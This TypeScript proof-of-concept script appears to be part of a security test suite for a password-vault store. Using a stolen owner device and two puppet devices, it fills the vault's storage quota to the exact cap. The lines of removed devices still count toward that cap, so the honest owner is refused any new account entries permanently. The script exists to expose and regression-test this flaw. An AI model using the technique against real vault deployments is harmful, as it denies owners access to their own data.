// @ts-nocheck PoC script, run as is by vaultRound6.test.ts
// R6-B: a stolen personal-vault phone (before it is removed) approves two puppets; the three write
// ordinary account changes within their own admin shares (8,000 lines each) through the honest
// agent. 3 x 6,700 > 20,000 = the vault-wide cap. The owner then removes all three (uncapped, taken),
// but removed identities' verified lines still count toward the vault cap (vaultQuota.ts tallyUsage
// walks after.chains), so every later honest account change is refused, forever.
// Runs the real VaultStore on a temp home. PASS = the attack worked.
import { build, check, dev, entry, now, open, random, rec, st } from './lib.ts';
import { tempStore } from './agentlib.ts';
const T = tempStore('r6b');
const ser = (e: any) => entry.serializeEntry(e);
try {
  const F = dev(), N = dev(), P1 = dev(), P2 = dev();
  const created = build.createVault({ founder: F, kind: 'personal', name: 'Home', deviceName: 'F', random, time: now() });
  const id = created.vaultId as string;
  const logs: Record<string, string[]> = {};
  const append = (entries: any[]) => {
    T.store.append(id, entries, false);
    for (const e of entries) (logs[e.author] ??= []).push(ser(e));
  };
  append([created.entry]);
  const approve = (by: any, d: any) => {
    const s = st(id, logs);
    append([build.buildDeviceAdd(s, by, { device: d, role: 'admin', name: 'x', currentKey: open.openVault(s, by).currentKey, random, time: now() })]);
    append([build.buildDeviceHello(st(id, logs), d, now())]);
  };
  approve(F, N); // owner's honest tablet
  approve(F, P1); // thief's puppets, approved while F is stolen and not yet removed
  approve(F, P2);
  const PER = 6_700;
  let stored = 0, full = '';
  // Fill to the exact cap: on a refusal, try the batch in halves, down to single lines.
  const tryAppend = (b: any[]): void => {
    if (full || b.length === 0) return;
    try { append(b); stored += b.length; } catch (err) {
      if (b.length === 1) { full = (err as Error).message; return; }
      const half = Math.ceil(b.length / 2);
      tryAppend(b.slice(0, half)); tryAppend(b.slice(half));
    }
  };
  const t0 = Date.now();
  for (const who of [F, P1, P2]) {
    let s = st(id, logs);
    const key = open.openVault(s, who).currentKey;
    let batch: any[] = [];
    let bytes = 0;
    for (let i = 0; i < PER; i++) {
      const e = build.buildAccountPut(s, who, { account: build.newAccountId(random), record: rec('i'), currentKey: key, random, time: now() });
      s = build.afterOwnEntry(s, e);
      const size = ser(e).length;
      if (batch.length === 1000 || bytes + size > 500_000) { tryAppend(batch); batch = []; bytes = 0; }
      batch.push(e); bytes += size;
    }
    if (batch.length) tryAppend(batch);
  }
  console.log('attacker stopped by:', full);
  console.log(`attacker lines stored: ${stored} in ${((Date.now() - t0) / 1000).toFixed(1)} s`);
  // Owner removes all three from N: removals of devices still in, by an active admin: uncapped.
  let removedOk = true;
  for (const who of [F, P1, P2]) {
    const s = st(id, logs);
    const r = build.buildDeviceRemove(s, N, { device: who.deviceId, currentKey: open.openVault(s, N).currentKey, random, time: now() });
    try { append([r.entry]); } catch (err) { removedOk = false; console.log('removal refused:', (err as Error).message); }
  }
  let s = st(id, logs);
  console.log('members:', Object.values(s.members).map((m: any) => `${m.deviceId.slice(0, 4)}${m.removed ? ':out' : ''}`).join(' '), 'needsFreshKey', s.needsFreshKey);
  if (s.needsFreshKey) {
    const r = build.buildKeyRotate(s, N, { currentKey: open.openVault(s, N).currentKey, random, time: now() });
    try { append([r.entry]); console.log('fresh key taken'); } catch (err) { console.log('fresh key refused:', (err as Error).message); }
    s = st(id, logs);
  }
  check('owner can remove the thief and both puppets', removedOk);
  let refused = '';
  try {
    append([build.buildAccountPut(s, N, { account: build.newAccountId(random), record: rec('MyBank'), currentKey: open.openVault(s, N).currentKey, random, time: now() })]);
  } catch (err) { refused = (err as Error).message; }
  check('after every attacker is removed, the owner still cannot add an account', refused !== '', refused);
} finally {
  T.cleanup();
}
